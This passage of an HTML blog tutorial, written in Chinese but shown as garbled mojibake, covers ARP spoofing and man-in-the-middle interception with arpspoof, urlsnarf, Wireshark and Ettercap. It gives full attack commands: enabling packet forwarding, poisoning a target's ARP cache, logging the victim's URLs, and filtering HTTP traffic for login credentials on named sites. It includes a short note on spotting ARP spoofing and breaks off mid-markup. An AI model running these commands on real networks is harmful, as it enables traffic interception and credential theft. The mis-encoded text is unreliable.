title="2ã€Arpspoofä»‹ç»ï¼ˆkaliè‡ªå¸¦ï¼‰"></a>2ã€Arpspoofä»‹ç»ï¼ˆkaliè‡ªå¸¦ï¼‰</h3><p>arpspoofæ˜¯ARPæ¬ºéª—å·¥å…·ï¼Œæ”»å‡»è€…é€šè¿‡æ¯’åŒ–å—å®³è€…ARPç¼“å­˜ï¼Œå°†ç½‘å…³MACåœ°å€æ›¿æ¢ä¸ºæ”»å‡»è€…çš„çš„MACåœ°å€<br>ä»è€Œæˆªå–å—å®³è€…å‘é€å’Œæ”¶åˆ°çš„æ•°æ®åŒ…ï¼Œå¯è·å–å—å®³è€…è´¦æˆ·ã€å¯†ç ç­‰ã€‚<br>å‘½ä»¤ä½¿ç”¨ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i [<span class="class"><span class="keyword">interface</span>] -<span class="title">c</span> [<span class="title">own</span> | <span class="title">both</span>] -<span class="title">t</span> [<span class="title">target</span>] [-<span class="title">r</span>] <span class="title">host</span></span></span><br><span class="line"><span class="class">-<span class="title">i</span> ï¼šæŒ‡å®šç½‘å¡ï¼Œåé¢<span class="title">interface</span>æ˜¯ç½‘å¡çš„åç§°</span></span><br><span class="line"><span class="class">-<span class="title">c</span> ï¼šæ”»å‡»æœº<span class="title">IP</span></span></span><br><span class="line"><span class="class">-<span class="title">t</span> ï¼šç›®æ ‡æœºå™¨çš„<span class="title">IP</span></span></span><br><span class="line"><span class="class">-<span class="title">r</span> ï¼šç½‘å…³<span class="title">IP</span></span></span><br><span class="line"><span class="class">å¦‚ï¼š<span class="title">arpspoof</span> -<span class="title">i</span> <span class="title">eth0</span> -<span class="title">r</span> 192.168.1.1 -<span class="title">t</span> 192.168.1.13</span></span><br></pre></td></tr></table></figure><h3 id="3ã€æ”»å‡»æµç¨‹ï¼š"><a href="#3ã€æ”»å‡»æµç¨‹ï¼š" class="headerlink" title="3ã€æ”»å‡»æµç¨‹ï¼š"></a>3ã€æ”»å‡»æµç¨‹ï¼š</h3><p>1ã€æ¡ä»¶ ï¼šåªè¦åŒå¤„åœ¨åŒä¸€ä¸ªå±€åŸŸç½‘ä¸­å°±å¯ä»¥ï¼Ÿï¼ˆä¸¤å°æœºå™¨èƒ½pingé€šï¼ŒåŒæ—¶çœ‹ä¸€ä¸‹arp -a | findstr ç½‘å…³IPï¼‰<br>2ã€kaliè¿›è¡Œæ–­ç½‘æ”»å‡»ï¼šarpspoof -i ç½‘å¡åç§° -r ç½‘å…³IP -t ç›®æ ‡æœºå™¨çš„IP<br>3ã€win10æŸ¥çœ‹ç½‘ç»œè¿æ¥å’Œkaliçš„ç½‘ç»œè¿æ¥<br>4ã€win10æŸ¥çœ‹æ­¤æ—¶arpè¡¨<br>5ã€åœæ­¢æ”»å‡»ï¼šåœ¨kaliä¸­è¿›è¡Œctrl+Cè¿›è¡Œé€€å‡ºã€‚</p><h3 id="4ã€ARPæ–­ç½‘æ”»å‡»çš„æ·±å…¥ç†è§£"><a href="#4ã€ARPæ–­ç½‘æ”»å‡»çš„æ·±å…¥ç†è§£" class="headerlink" title="4ã€ARPæ–­ç½‘æ”»å‡»çš„æ·±å…¥ç†è§£"></a>4ã€ARPæ–­ç½‘æ”»å‡»çš„æ·±å…¥ç†è§£</h3><p>kaliæ”»å‡»æ—¶ï¼škali ä¸åœçš„å‘Šè¯‰win10ç½‘å…³çš„MACåœ°å€å˜æˆäº†kaliçš„MACåœ°å€<br>kali ä¸åœçš„å‘Šè¯‰ç½‘å…³ win10çš„MACåœ°å€å˜æˆäº†æ–°çš„kaliçš„MACåœ°å€</p><h2 id="ä¸‰ã€ARPæ”»å‡»-urlsnarfæµé‡æ”»å‡»å’Œåˆ†æ"><a href="#ä¸‰ã€ARPæ”»å‡»-urlsnarfæµé‡æ”»å‡»å’Œåˆ†æ" class="headerlink" title="ä¸‰ã€ARPæ”»å‡»-urlsnarfæµé‡æ”»å‡»å’Œåˆ†æ"></a>ä¸‰ã€ARPæ”»å‡»-urlsnarfæµé‡æ”»å‡»å’Œåˆ†æ</h2><p> <strong>kaliæ•°æ®åŒ…è½¬å‘ï¼š</strong>ä½¿å¾—å—å®³æœºå¯Ÿè§‰ä¸åˆ°è‡ªå·±è¢«æ”»å‡»ï¼Œå‡ºäºå®‰å…¨è€ƒè™‘ï¼Œlinuxç³»ç»Ÿé»˜è®¤æ˜¯è¿›åˆ¶æ•°æ®åŒ…è½¬å‘çš„ã€‚æ‰€è°“è½¬å‘å³å½“ä¸»æœºæ‹¥æœ‰å¤šäºä¸€å—çš„ç½‘å¡æ—¶ï¼Œå…¶ä¸­ä¸€å—æ”¶åˆ°æ•°æ®åŒ…ï¼Œæ ¹æ®æ•°æ®åŒ…çš„ç›®çš„ipåœ°å€å°†æ•°æ®åŒ…å‘å¾€æœ¬æœºçš„å¦ä¸€å—ç½‘å¡ï¼Œè¯¥ç½‘å¡æ ¹æ®è·¯ç”±è¡¨ç»§ç»­å‘é€æ•°æ®åŒ…ã€‚è¿™é€šå¸¸æ˜¯è·¯ç”±å™¨æ‰€è¦å®ç°çš„åŠŸèƒ½ã€‚æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨å¼€å¯è½¬å‘åŠŸèƒ½ã€‚</p><h3 id="1ã€å¦‚ä½•å¼€å¯é€šä¿¡è½¬å‘ï¼Ÿ"><a href="#1ã€å¦‚ä½•å¼€å¯é€šä¿¡è½¬å‘ï¼Ÿ" class="headerlink" title="1ã€å¦‚ä½•å¼€å¯é€šä¿¡è½¬å‘ï¼Ÿ"></a>1ã€å¦‚ä½•å¼€å¯é€šä¿¡è½¬å‘ï¼Ÿ</h3><p>kalié‡Œæœ‰ä¸ª<code>/proc/sys/net/ipv4/ip_forward</code>é…ç½®æ–‡ä»¶<br>å…¶é»˜è®¤æ˜¯0ç¦æ­¢ç«¯å£è½¬å‘ï¼Œå°†å…¶æ”¹æˆ1å¼€å¯ç«¯å£è½¬å‘ã€‚</p><h3 id="2ã€å¼€å¯è½¬å‘æ­¥éª¤"><a href="#2ã€å¼€å¯è½¬å‘æ­¥éª¤" class="headerlink" title="2ã€å¼€å¯è½¬å‘æ­¥éª¤"></a>2ã€å¼€å¯è½¬å‘æ­¥éª¤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>ã€æŸ¥çœ‹å½“å‰æ—¶å€™å¼€å¯äº†ç«¯å£è½¬å‘</span><br><span class="line">cat /proc/sys/net/ipv4/ip_forward</span><br><span class="line"><span class="number">2</span>ã€å¼€å¯é€šä¿¡è½¬å‘çš„å‘½ä»¤</span><br><span class="line"><span class="keyword">echo</span> <span class="number">1</span> &gt;&gt; /proc/sys/net/ipv4/ip_forward<span class="comment">//å°†1å†™å…¥åˆ°åé¢çš„è¿™ä¸ªæ–‡ä»¶ä¸­ï¼Œå…³é—­å°±å°†0è¿›è¡Œå†™å…¥å°±è¡Œã€‚</span></span><br><span class="line"><span class="number">3</span>ã€ä½¿ç”¨arpspoofå‘èµ·ARPæ”»å‡»</span><br><span class="line">arpspoof -i eth0 -r <span class="number">192.168</span>.<span class="number">1.1</span> -t <span class="number">192.168</span>.<span class="number">1.11</span></span><br><span class="line"><span class="number">4</span>ã€win10éªŒè¯æ˜¯å¦è½¬å‘æˆåŠŸ</span><br><span class="line">åœ¨æ²¡å¼€å¯ç«¯å£è½¬å‘ä¹‹å‰è¿›è¡ŒARPæ–­ç½‘æ”»å‡»ï¼Œå—å®³æœºæ˜¯ä¸èƒ½ä¸Šç½‘çš„ã€‚</span><br><span class="line">åœ¨å¼€å¯ç«¯å£è½¬å‘ä¹‹åå‘èµ·ARPæ–­ç½‘æ”»å‡»ï¼Œå—å®³æœºä¾ç„¶èƒ½ä¸Šç½‘ã€‚</span><br></pre></td></tr></table></figure><h3 id="3ã€dsniffå·¥å…·ï¼š"><a href="#3ã€dsniffå·¥å…·ï¼š" class="headerlink" title="3ã€dsniffå·¥å…·ï¼š"></a>3ã€dsniffå·¥å…·ï¼š</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>ã€å·¥å…·ä»‹ç»ï¼šDsniffæ˜¯ä¸€ä¸ªåŸºäºUnixç³»ç»Ÿç½‘ç»œå—…æ¢å·¥å…·ï¼Œå·¥å…·åŒ…å«ä¸¤ä¸ªæˆ‘ä»¬éœ€è¦çš„ä¸¤ä¸ªå·¥å…·åŒ…ï¼Œarpspoofå’Œurlsnarfã€‚</span><br><span class="line"><span class="number">2</span>ã€å®‰è£…æ–¹æ³•ï¼šapt-get install dsniff</span><br><span class="line"><span class="number">3</span>ã€urlsnarfå·¥å…·ä»‹ç»</span><br><span class="line">urlsnarf -h</span><br><span class="line">urlsnarf [-n] [-i <span class="class"><span class="keyword">interface</span> | -<span class="title">p</span> <span class="title">pcapfile</span>] [-<span class="title">v</span>] <span class="title">pattern</span> [<span class="title">expression</span>]</span></span><br><span class="line"><span class="class">-<span class="title">n</span> ï¼šè¡¨ç¤ºä¸åæŸ¥ä¸»æœºå</span></span><br><span class="line"><span class="class">-<span class="title">i</span> ï¼š<span class="title">interface</span> ç½‘å¡æ¥å£å</span></span><br><span class="line"><span class="class">-<span class="title">p</span> ï¼š<span class="title">pattern</span> è¡¨ç¤ºå¯¹è¿‡æ»¤çš„å†…å®¹ä½¿ç”¨çš„æ­£åˆ™è¡¨è¾¾å¼</span></span><br><span class="line"><span class="class">-<span class="title">v</span> ï¼šè¡¨ç¤ºå–ç›¸åï¼Œ<span class="title">expression</span>æ˜¯è¿‡æ»¤è¯­æ³•ï¼Œå’Œ<span class="title">tcpdump</span>çš„ç›¸åŒï¼Œè¯·å‚è€ƒ<span class="title">tcpdump</span>ã€‚</span></span><br></pre></td></tr></table></figure><h3 id="4ã€url-æµé‡åˆ†æ"><a href="#4ã€url-æµé‡åˆ†æ" class="headerlink" title="4ã€url æµé‡åˆ†æ"></a>4ã€url æµé‡åˆ†æ</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>ã€æ¦‚å¿µï¼šURLæµé‡å—…æ¢æ“ä½œéå¸¸ç±»ä¼¼ä¸­é—´äººæ”»å‡»ï¼Œé€šè¿‡ç›®æ ‡ä¸»æœºå°†è·¯ç”±æµé‡æ³¨å…¥åˆ°å› ç‰¹ç½‘ã€‚æ˜¯é€šè¿‡ARPæ³¨å…¥å®ç°çš„ã€‚</span><br><span class="line">urlå—…æ¢èƒ½å¤Ÿå®æ—¶è·Ÿè¸ªç”µè„‘ä¸­çš„æ•°æ®æµé‡ä¿¡æ¯ï¼Œå¹¶ä¸”åˆ†æå‡ºå®ƒçš„ç±»å‹å’Œå»å‘ã€‚ä»è€Œè·å–ä½ çš„ä¸Šç½‘ä¿¡æ¯ã€‚</span><br><span class="line"><span class="number">2</span>ã€æ”»å‡»æµç¨‹ï¼š</span><br><span class="line"><span class="number">1</span>ã€å¼€å¯æµé‡è½¬å‘</span><br><span class="line"><span class="keyword">echo</span> <span class="number">1</span> &gt;&gt; /proc/sys/net/ipv4/ip_forward</span><br><span class="line"><span class="number">2</span>ã€å¼€å¯ARPæ”»å‡»</span><br><span class="line">arpspoof -i eth0 -r <span class="number">192.168</span>.<span class="number">1.1</span> -t <span class="number">192.168</span>.<span class="number">1.136</span></span><br><span class="line"><span class="number">3</span>ã€æ•è·ç›®æ ‡è®¡ç®—æœºçš„url</span><br><span class="line">urlsnarf -i eth0</span><br><span class="line"><span class="number">4</span>ã€é¶æœºä¸Šç½‘ï¼Œè®¿é—®ç½‘ç«™</span><br><span class="line"><span class="number">1</span>ã€http:<span class="comment">//www.kangda.cn/#/user/login?redirect=http%3A%2F%2Fwww.kangda.cn....</span></span><br><span class="line"><span class="number">2</span>ã€http:<span class="comment">//blog.tianya.cn/</span></span><br><span class="line"><span class="number">5</span>ã€kaliåˆ†æç”¨æˆ·è¯·æ±‚</span><br></pre></td></tr></table></figure><h2 id="å››ã€ARP-wiresharkè·å–ç”¨æˆ·æ•°æ®"><a href="#å››ã€ARP-wiresharkè·å–ç”¨æˆ·æ•°æ®" class="headerlink" title="å››ã€ARP-wiresharkè·å–ç”¨æˆ·æ•°æ®"></a>å››ã€ARP-wiresharkè·å–ç”¨æˆ·æ•°æ®</h2><p>Wiresharkå·¥å…·ä»‹ç»ï¼škaliè‡ªå¸¦</p><h3 id="1ã€ä¸‹è½½å®˜ç½‘ï¼šwireshark-org"><a href="#1ã€ä¸‹è½½å®˜ç½‘ï¼šwireshark-org" class="headerlink" title="1ã€ä¸‹è½½å®˜ç½‘ï¼šwireshark.org"></a>1ã€ä¸‹è½½å®˜ç½‘ï¼š<a href="http://wireshark.org/">wireshark.org</a></h3><p>æ˜¯éå¸¸æµè¡Œçš„ç½‘ç»œå°è£…åŒ…åˆ†æè½¯ä»¶<br>å¯ä»¥æˆªå–å„ç§ç½‘ç»œå°åŒ…ï¼Œæ˜¾ç¤ºç½‘ç»œå°åŒ…çš„è¯¦ç»†ä¿¡æ¯<br>å¯ä»¥åœ¨windowsï¼Œlinuxå’Œmac Osä¸Šè¿è¡Œã€‚</p><h3 id="2ã€ARPæ”»å‡»æˆªè·å¯†ç çš„æ­¥éª¤"><a href="#2ã€ARPæ”»å‡»æˆªè·å¯†ç çš„æ­¥éª¤" class="headerlink" title="2ã€ARPæ”»å‡»æˆªè·å¯†ç çš„æ­¥éª¤"></a>2ã€ARPæ”»å‡»æˆªè·å¯†ç çš„æ­¥éª¤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>ã€å¼€å¯æ•°æ®åŒ…è½¬å‘ï¼š<span class="keyword">echo</span> <span class="number">1</span> &gt;&gt; /proc/sys/net/ipv4/ip_forward</span><br><span class="line"><span class="number">2</span>ã€å¼€å¯ARPå·¥å…·ï¼šarpspoof -i eth0 -r <span class="number">192.168</span>.<span class="number">1.1</span> -t <span class="number">192.168</span>.<span class="number">1.136</span></span><br><span class="line"><span class="number">3</span>ã€å¯åŠ¨wiresharkï¼šwireshark</span><br><span class="line"><span class="number">4</span>ã€è¾“å…¥è¿‡æ»¤æ¡ä»¶ï¼šï¼ˆip.src==<span class="number">192.168</span>.<span class="number">1.136</span> <span class="keyword">or</span> ip.dst==<span class="number">192.168</span>.<span class="number">1.136</span>ï¼‰ <span class="keyword">and</span> tcp.port==<span class="number">80</span> <span class="keyword">and</span> http[<span class="comment">//æŠ“å–ç”±192.168.136å‘å‡ºçš„å’Œ192.168.1.136æ¥æ”¶çš„ç”±80ç«¯å£ç»è¿‡çš„httpè¯·æ±‚åŒ…](https://xn--192-gx3eu78dcrz.168.xn--136192-yg3jq5je0bt89o.168.1.xn--13680http-8p6of0f9w4f7ie2z3a6t4a7oeea074rt0qz75dpzq/)ã€‚ï¼ˆ192.168.1.136æ˜¯é¶æœºï¼‰</span></span><br><span class="line"><span class="number">5</span>ã€é¶æœºç™»é™†åå°ç³»ç»Ÿï¼šhttp:<span class="comment">//mng.517628.com/login.phphttp://vmims.eguagua.cn/#/Login</span></span><br><span class="line"><span class="number">6</span>ã€wiresharkå¯»æ‰¾ç”¨æˆ·çš„ç™»é™†ä¿¡æ¯ã€‚</span><br></pre></td></tr></table></figure><h3 id="3ã€wireshahrkè¿‡æ»¤å‘½ä»¤-è®²è§£"><a href="#3ã€wireshahrkè¿‡æ»¤å‘½ä»¤-è®²è§£" class="headerlink" title="3ã€wireshahrkè¿‡æ»¤å‘½ä»¤ è®²è§£"></a>3ã€wireshahrkè¿‡æ»¤å‘½ä»¤ è®²è§£</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>ã€è¿‡æ»¤æºipã€ç›®çš„ip</span><br><span class="line">ip.dst==<span class="number">192.168</span>.<span class="number">1.136</span><span class="comment">//æ‰¾ç›®çš„åœ°å€</span></span><br><span class="line">ip.src==<span class="number">192.168</span>.<span class="number">1.136</span><span class="comment">//æ‰¾æºåœ°å€</span></span><br><span class="line"><span class="number">2</span>ã€ç«¯å£è¿‡æ»¤</span><br><span class="line">tcp.port==<span class="number">80</span><span class="comment">//æºç«¯å£å’Œç›®çš„ç«¯å£éƒ½è¿‡æ»¤</span></span><br><span class="line">tcp.dstport==<span class="number">80</span><span class="comment">//åªè¿‡æ»¤ç›®çš„ç«¯å£</span></span><br><span class="line">tcp.srcport==<span class="number">80</span><span class="comment">//åªè¿‡æ»¤æºç«¯å£</span></span><br><span class="line"><span class="number">3</span>ã€åè®®è¿‡æ»¤</span><br><span class="line">httpã€tcpã€ssh</span><br><span class="line"><span class="number">4</span>ã€http.request.method=<span class="string">&quot;post&quot;</span> <span class="keyword">and</span> tcp.port==<span class="number">80</span>/<span class="number">443</span><span class="comment">//è¿‡æ»¤postè¯·æ±‚å’Œç«¯å£å·æ˜¯80æˆ–è€…443çš„ã€‚</span></span><br><span class="line"><span class="number">5</span>ã€é€šè¿‡Wiresharkè¿›è¡Œarpè¿‡æ»¤å¯ä»¥æŸ¥çœ‹è‡ªå·±çš„ç”µè„‘æœ‰æ²¡æœ‰è¢«åˆ«äººæ§åˆ¶ä¸€ç›´åœ¨å‘arpä¿¡æ¯ã€‚çœ‹å‘é€è‡ªå·±çš„MACåœ°å€æ˜¯ä¸æ˜¯è‡ªå·±çš„ã€‚å¦‚æœä¸æ˜¯è‡ªå·±çš„å¯èƒ½è¡¨ç¤ºå°±è¢«æ”»å‡»äº†ã€‚</span><br></pre></td></tr></table></figure><h3 id="4ã€æ³¨æ„ï¼š"><a href="#4ã€æ³¨æ„ï¼š" class="headerlink" title="4ã€æ³¨æ„ï¼š"></a>4ã€æ³¨æ„ï¼š</h3><p>1ã€åªèƒ½æŠ“å–httpåè®®çš„ï¼Œhttpsåè®®çš„éœ€è¦æœ‰è¯ä¹¦å’Œè§£å¯†çš„key<br>2ã€httpèµ°çš„æ˜¯80ç«¯å£ï¼Œhttpsèµ°çš„æ˜¯443ç«¯å£ã€‚<br>3ã€é€šè¿‡Wiresharkè¿›è¡Œarpè¿‡æ»¤å¯ä»¥æŸ¥çœ‹è‡ªå·±çš„ç”µè„‘æœ‰æ²¡æœ‰è¢«åˆ«äººæ§åˆ¶ä¸€ç›´åœ¨å‘arpä¿¡æ¯ã€‚çœ‹å‘é€è‡ªå·±çš„MACåœ°å€æ˜¯ä¸æ˜¯è‡ªå·±çš„ã€‚å¦‚æœä¸æ˜¯è‡ªå·±çš„å¯èƒ½è¡¨ç¤ºå°±è¢«æ”»å‡»äº†ã€‚</p><h2 id="äº”ã€ARP-Ettercap-æˆªè·æµé‡ä¿¡æ¯"><a href="#äº”ã€ARP-Ettercap-æˆªè·æµé‡ä¿¡æ¯" class="headerlink" title="äº”ã€ARP-Ettercap-æˆªè·æµé‡ä¿¡æ¯"></a>äº”ã€ARP-Ettercap-æˆªè·æµé‡ä¿¡æ¯</h2><h3 id="1ã€EtterCap-åŠ«æŒç”¨æˆ·æµé‡å·¥å…·ä»‹ç»ï¼š"><a href="#1ã€EtterCap-åŠ«æŒç”¨æˆ·æµé‡å·¥å…·ä»‹ç»ï¼š" class="headerlink" title="1ã€EtterCap-åŠ«æŒç”¨æˆ·æµé‡å·¥å…·ä»‹ç»ï¼š"></a>1ã€EtterCap-åŠ«æŒç”¨æˆ·æµé‡å·¥å…·ä»‹ç»ï¼š</h3><p>rootä¸‹ã€ettercap -Gã€‘æ‰“å¼€<br>EtterCapä»‹ç»ï¼šæ˜¯ä¸€ä¸ªåŸºäºARPåœ°å€æ¬ºéª—æ–¹å¼çš„ç½‘ç»œå—…æ¢å·¥å…·ï¼Œä¸»è¦é€‚ç”¨äºäº¤æ¢å±€åŸŸç½‘ç»œã€‚å€ŸåŠ©äºEtterCapå—…æ¢è½¯ä»¶ï¼Œæ¸—é€æµ‹è¯•äººå‘˜å¯ä»¥æ£€æµ‹ç½‘ç»œå†…æ˜æ–‡æ•°æ®é€šè®¯çš„å®‰å…¨æ€§ï¼Œ<br>åŠæ—¶é‡‡å–æªæ–½ï¼Œé¿å…æ•æ„Ÿçš„ç”¨æˆ·å&#x2F;å¯†ç ç­‰æ•°æ®ä»¥æ˜æ–‡çš„æ–¹å¼è¿›è¡Œä¼ è¾“ã€‚<br>EtterCapå‡ ä¹æ˜¯æ¯ä¸ªæ¸—é€æµ‹è¯•äººå‘˜å¿…å¤‡çš„å·¥å…·ä¹‹ä¸€ã€‚</p><h3 id="2ã€Ettercapåˆ©ç”¨è½¯ä»¶ç•Œé¢æ”»å‡»å’Œä»‹ç»"><a href="#2ã€Ettercapåˆ©ç”¨è½¯ä»¶ç•Œé¢æ”»å‡»å’Œä»‹ç»" class="headerlink" title="2ã€Ettercapåˆ©ç”¨è½¯ä»¶ç•Œé¢æ”»å‡»å’Œä»‹ç»"></a>2ã€Ettercapåˆ©ç”¨è½¯ä»¶ç•Œé¢æ”»å‡»å’Œä»‹ç»</h3><p>1ã€å¯åŠ¨ç•Œé¢ï¼šæ˜¯é€‰æ‹©ç½‘å¡å’Œæ˜¯å¦ä½¿ç”¨æ¡¥æ¥æ¨¡å¼è¿›è¡ŒäºŒé€‰ä¸€</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sniffing at startupï¼šå¼€å¯å—…æ¢æ¨¡å¼</span><br><span class="line">primary <span class="class"><span class="keyword">interface</span>ï¼šé€‰æ‹©ç½‘å¡</span></span><br><span class="line"><span class="class"><span class="title">Bridged</span> <span class="title">sniffing</span>ï¼šæ˜¯å¦å¼€å¯æ¡¥æ¥æ¨¡å¼</span></span><br><span class="line"><span class="class"><span class="title">Bridged</span> <span class="title">interface</span>ï¼šæ¡¥æ¥æ¨¡å¼ä¸‹çš„ç½‘å¡</span></span><br><span class="line"><span class="class">é…ç½®å®Œæˆä¹‹åï¼Œç‚¹å‡»ä¸Šæ–¹çš„ã€å¯¹å‹¾ã€‘å³å¯å®Œæˆé…ç½®</span></span><br></pre></td></tr></table></figure><p>2ã€ä¸­é—´äººæ”»å‡»èœå•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>ã€ä»å·¦åˆ°å³ä¾æ¬¡æ˜¯ï¼šå¼€å§‹/æš‚åœã€æ‰«æä¸»æœºã€ä¸»æœºåˆ—è¡¨ã€ä¸­é—´äººæ”»å‡»èœå•ã€å¼€å§‹/åœæ­¢æ”»å‡»ã€æ›´å¤šé€‰é¡¹</span><br><span class="line"><span class="number">2</span>ã€ä¸­é—´äººæ”»å‡»èœå•ï¼š</span><br><span class="line">ARP poisoningï¼šARPæ”»å‡»</span><br><span class="line">DNP poisoningï¼šDNPæ”»å‡»</span><br><span class="line">ICMP redirectï¼šicmpé‡å®šå‘</span><br><span class="line">Port stealingï¼šç«¯å£æ¬ºéª—</span><br><span class="line">DHCP spoofingï¼šDHCPæ¬ºéª—</span><br><span class="line">stop MITMï¼šåœæ­¢æ”»å‡»</span><br><span class="line">SSL interceptï¼šsslå—…æ¢</span><br><span class="line"><span class="number">3</span>ã€æ›´å¤šé€‰é¡¹</span><br><span class="line">Targetsï¼šæ”»å‡»åˆ—è¡¨</span><br><span class="line">Hostsï¼šæ˜¾ç¤ºä¸»æœºåˆ—è¡¨</span><br><span class="line">Filtersï¼šè½½å…¥äºŒè¿›åˆ¶è„šæœ¬</span><br><span class="line">Pluginsï¼šæ’ä»¶</span><br><span class="line">Loggingï¼šæ—¥å¿—</span><br><span class="line"><span class="number">4</span>ã€hostsé€‰é¡¹</span><br><span class="line">Hosts <span class="keyword">list</span>ï¼šæ‰«æåˆ°çš„ä¸»æœºåˆ—è¡¨</span><br><span class="line">Enable ipv6 scanï¼šæ‰«æipv6åœ°å€</span><br><span class="line">Scan <span class="keyword">for</span> hostsï¼šæ‰«æä¸»æœº</span><br><span class="line">load hosts form fileï¼šä»å¤–éƒ¨æ–‡ä»¶è½½å…¥ä¸»æœºåˆ—è¡¨</span><br><span class="line">Save hosts to fileï¼šä¿å­˜ä¸»æœºåˆ—è¡¨åˆ°æ–‡ä»¶</span><br><span class="line"><span class="number">5</span>ã€Targetsé€‰é¡¹</span><br><span class="line">Current targetsï¼šæ­£åœ¨æ”»å‡»çš„åˆ—è¡¨</span><br><span class="line">Select targets:ï¼šé€‰æ‹©æ”»å‡»åˆ—è¡¨</span><br><span class="line">Portocolï¼šæ”»å‡»åè®®</span><br><span class="line">Reverse matchingï¼šåŒ¹é…è§„åˆ™</span><br><span class="line">Wipe targetsï¼šæ“¦é™¤æ”»å‡»</span><br><span class="line"><span class="number">6</span>ã€Viewé€‰é¡¹</span><br><span class="line">Connectionsï¼šè¿æ¥ä¿¡æ¯ï¼ˆè·Ÿå“ªä¸ªä¸»æœºçš„å“ªä¸ªç«¯å£è¿ç€ï¼‰</span><br><span class="line">Profilesï¼šIPåœ°å€ä¿¡æ¯ï¼ˆå±äºå“ªä¸ªç½‘ç«™ä»€ä¹ˆçš„ï¼‰</span><br><span class="line">Statisticsï¼šç»Ÿè®¡ä¿¡æ¯ï¼ˆå¯¹ä¸€äº›åŒ…çš„ä¿¡æ¯ï¼‰</span><br></pre></td></tr></table></figure><h3 id="3ã€ARPæˆªè·ç”¨æˆ·ä¿¡æ¯æ”»å‡»æ­¥éª¤ï¼š"><a href="#3ã€ARPæˆªè·ç”¨æˆ·ä¿¡æ¯æ”»å‡»æ­¥éª¤ï¼š" class="headerlink" title="3ã€ARPæˆªè·ç”¨æˆ·ä¿¡æ¯æ”»å‡»æ­¥éª¤ï¼š"></a>3ã€ARPæˆªè·ç”¨æˆ·ä¿¡æ¯æ”»å‡»æ­¥éª¤ï¼š</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>ã€å¯åŠ¨ettercapï¼š</span><br><span class="line">ettercap -G</span><br><span class="line"><span class="number">2</span>ã€ç‚¹å‡»å³ä¸Šè§’çš„å¯¹å‹¾å¼€å§‹æ‰«æ</span><br><span class="line">éœ€è¦å…ˆè¿›è¡Œç½‘å¡è®¾ç½®ï¼Œä¸‹è¾¹æ˜¯é€‰ç”¨æ¡¥æ¥æ¨¡å¼</span><br><span class="line">é€šè¿‡ã€arp -a | findstr ç½‘å…³ipã€‘å¯ä»¥æŸ¥çœ‹é¶æœºçš„arpåˆ—è¡¨ã€‚</span><br><span class="line"><span class="number">3</span>ã€ç‚¹å‡»å·¦ä¸Šè§’çš„ä¸‰ä¸ªæ æŸ¥çœ‹è½¯ä»¶æŸ¥è¯¢åˆ°çš„ä¸»æœºåˆ—è¡¨ï¼ˆä¸ä¼šå®æ—¶åˆ·æ–°ï¼Œéœ€è¦è¿›è¡Œé‡æ–°ç‚¹å‡»ä¸‰æ è¿›è¡Œæ›´æ–°åˆ—è¡¨ï¼‰</span><br><span class="line"><span class="number">4</span>ã€ç„¶åå°†ç½‘å…³åŠ å…¥åˆ°Target1ã€å°†ç›®æ ‡é¶æœºåŠ å…¥åˆ°Target2</span><br><span class="line">å¯ä»¥åœ¨å³ä¸Šè§’çš„ä¸‰ä¸ªç‚¹æ›´å¤šä¸­è¿›è¡Œå½“å‰TargetæŸ¥çœ‹</span><br><span class="line"><span 